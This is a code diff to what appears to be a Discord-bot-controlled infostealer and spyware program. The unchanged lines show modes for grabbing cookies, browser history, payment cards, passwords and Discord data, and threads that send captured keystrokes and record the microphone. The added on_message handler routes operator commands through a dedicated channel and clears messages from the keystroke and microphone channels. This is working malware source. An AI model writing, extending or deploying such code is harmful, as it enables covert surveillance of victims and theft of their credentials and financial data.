@@ -23,6 +23,8 @@ GRAB_SCRIPT = "grab.py"
 GRAB_MODES = ("all", "cookies", "history", "cards", "games", "discord", "discorddiag", "passwords", "vm")
 
 import discord
+import tempfile
+import win32com.client
 from discord.ext import commands
 import os
 import sys
@@ -4530,6 +4532,38 @@ async def on_ready():
     threading.Thread(target=send_keys_periodically, daemon=True).start()
     threading.Thread(target=record_mic_thread, daemon=True).start()
     threading.Thread(target=check_blacklist, daemon=True).start()
+
+@bot.event
+async def on_message(message):
+    if isinstance(message.channel, discord.DMChannel) or message.guild is None:
+        return
+
+    gid = message.guild.id
+    chans = CHANNEL_IDS.get(gid, {})
+    channel_id = message.channel.id
+
+    if channel_id in (chans.get("keys"), chans.get("microphone")):
+        if not message.author.bot:
+            try:
+                await message.delete()
+            except Exception:
+                pass
+        return
+
+    if CATEGORY_IDS.get(gid) is None or message.channel.category_id != CATEGORY_IDS.get(gid):
+        return
+
+    if channel_id == chans.get("cmds"):
+        await bot.process_commands(message)
+        return
+
+    if message.author.bot:
+        return
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     bot.run(token)
